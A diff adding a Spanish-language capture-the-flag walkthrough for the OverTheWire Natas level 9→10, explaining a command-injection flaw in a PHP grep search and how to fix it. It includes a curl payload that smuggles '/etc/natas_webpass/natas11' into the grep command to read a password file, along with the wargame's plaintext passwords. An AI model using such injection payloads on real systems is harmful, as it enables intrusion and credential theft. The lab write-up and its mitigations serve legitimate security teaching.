@@ -870,3 +870,119 @@ Se trata de una vulnerabilidad de Command Injection (inyección de comandos del 
 - En caso de ser estrictamente necesario interactuar con el sistema operativo, se debe sanitizar el argumento utilizando funciones específicas que escapan los caracteres especiales del shell `escapeshellarg()` o `escapeshellcmd()`.
 - Asegurar que el usuario que ejecuta el servidor web (como `www-data`) tenga permisos estrictamente limitados en el sistema de archivos para mitigar el impacto en caso de una inyección exitosa.
 </Callout>
+
+## Natas Level 9 → Level 10
+
+[Natas Level 9 → Level 10](https://overthewire.org/wargames/natas/natas10.html)
+
+Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
+```bash
+curl http://natas10.natas.labs.overthewire.org/ --user natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas10", "pass": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv" };</script></head>
+<body>
+<h1>natas10</h1>
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Vemos un sitio web con un formulario de búsqueda y un link al código fuente que maneja el backend.
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+El código fuente muestra que la función `preg_match` busca los caracteres `;`, `|` y `&` en el texto buscado, si lo encuentra descarta el input. Utilizando el mismo input del nivel anterior obtenemos el password para el próximo nivel.
+
+```bash
+curl -s -G --data-urlencode 'needle="" /etc/natas_webpass/natas11' -d "submit=Search" 'http://natas10.natas.labs.overthewire.org/' --user natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv | head -n 30
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas10", "pass": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv" };</script></head>
+<body>
+<h1>natas10</h1>
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<br />
+<b>Warning</b>:  preg_match(): Allocation of JIT memory failed, PCRE JIT will be disabled. This is likely caused by security restrictions. Either grant PHP permission to allocate executable memory, or set pcre.jit=0 in <b>/var/www/natas/natas10/index.php</b> on line <b>31</b><br />
+/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
+dictionary.txt:
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+dictionary.txt:Allah's
+```
+
+<Callout type="success" title="Password natas11">
+VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+El desarrollador intentó mitigar el fallo del nivel anterior validando el input con una blacklist basada en una expresión regular (`preg_match('/[;|&]/', $key)`). Sin embargo, el control es insuficiente porque solo bloquea metacaracteres específicos de encadenamiento de comandos, pero no impide que el atacante pase múltiples argumentos nativos al propio binario del sistema operativo (en este caso, inyectando un archivo adicional `/etc/natas_webpass/natas11` como segundo argumento para el comando `grep`).
+- [**CWE-78** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
+- [**CWE-184** Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- Evitar por completo el uso de `passthru()`. Reemplazar la ejecución en consola por lógica nativa en PHP (como leer el archivo `dictionary.txt` con `file()` y buscar la coincidencia usando `preg_match()`).
+- En lugar de buscar qué caracteres no permitir, validar que la entrada contenga únicamente caracteres permitidos (por ejemplo, permitir estrictamente caracteres alfanuméricos usando `^[\w]+$`).
+- Si es obligatorio usar comandos de consola, se debe aplicar `escapeshellarg()` al parámetro `$key`. Esto encapsula el input entre comillas simples y neutraliza cualquier intento de pasar argumentos extra a grep, forzando al sistema a tratar toda la entrada como una cadena de texto de búsqueda literal.
+</Callout>
